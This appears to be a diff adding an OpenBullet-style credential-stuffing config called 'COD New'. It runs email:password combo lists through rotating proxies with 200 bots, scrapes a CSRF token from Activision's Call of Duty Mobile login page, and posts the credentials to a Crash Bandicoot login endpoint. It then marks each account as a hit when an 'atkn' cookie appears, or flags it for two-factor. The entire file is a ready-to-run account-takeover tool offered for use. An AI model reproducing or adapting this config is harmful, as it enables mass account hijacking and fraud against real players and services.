@@ -1,0 +1,95 @@
+[SETTINGS]
+{
+  "Name": "COD New",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2021-08-13T19:27:10.6284875+00:00",
+  "AdditionalInfo": "",
+  "Author": "Almadny",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#TK REQUEST GET "https://s.activision.com/cod-mobile/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#csrf PARSE "<SOURCE>" LR "<meta name=\"_csrf\" content=\"" "\"/>" -> VAR "TK" 
+
+#login REQUEST POST "https://s.crashbandicoot.com/do_login?new_SiteId=crash" 
+  CONTENT "username=<USER>&remember_me=true&password=<PASS>&_csrf=<TK>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 148" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Host: s.crashbandicoot.com" 
+  HEADER "Origin: https://s.crashbandicoot.com" 
+  HEADER "Referer: https://s.crashbandicoot.com/crash/login?redirectUrl=https%3A%2F%2Fwww.crashbandicoot.com%2F%23" 
+  HEADER "sec-ch-ua: \" Not;A Brand\";v=\"99\", \"Microsoft Edge\";v=\"91\", \"Chromium\";v=\"91\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Edg/91.0.864.59" 
+
+#keycheck KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<COOKIES(*)>" Contains "LOGIN_FAILURE" 
+    KEY "<COOKIES{*}>" Contains "LOGIN_FAILURE" 
+    KEY "<RESPONSECODE>" EqualTo "302" 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES(*)>" Contains "atkn" 
+    KEY "<COOKIES{*}>" Contains "atkn" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "Two-factor" 
+
+FUNCTION Constant "@R_P_8" -> CAP "config by" 
+
